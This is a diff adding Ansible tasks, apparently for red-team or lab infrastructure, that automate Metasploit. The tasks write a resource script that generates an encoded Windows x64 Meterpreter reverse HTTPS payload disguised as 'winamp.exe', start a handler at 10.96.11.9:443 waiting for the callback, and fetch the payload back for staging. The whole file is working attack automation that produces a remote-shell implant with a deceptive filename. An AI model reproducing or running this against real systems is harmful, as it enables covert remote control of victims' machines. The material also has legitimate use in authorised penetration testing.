@@ -1,0 +1,24 @@
+- name: Create Metasploit Resource Script
+  copy:
+    dest: "/home/red/https-handler.rc"
+    content: |
+      use payload/windows/x64/meterpreter/reverse_https
+      set lhost 10.96.11.9
+      set lport 443
+      set luri /session-id
+      generate -f exe -e x64/zutto_dekiru -o /home/red/winamp.exe
+      use exploit/multi/handler
+      set payload windows/x64/meterpreter/reverse_https
+      set lhost 10.96.11.9
+      set lport 443
+      set luri /session-id/
+      exploit -j
+
+- name: Execute Metasploit and run script
+  ansible.builtin.shell: msfconsole -r /home/red/https-handler.rc
+
+- name: Retrive payload file to ansible server for staging
+  fetch:
+    src: /home/red/winamp.exe
+    dest: ./ansible/roles/misc/msf-drop-payload/files/winamp.exe
+    flat: yes
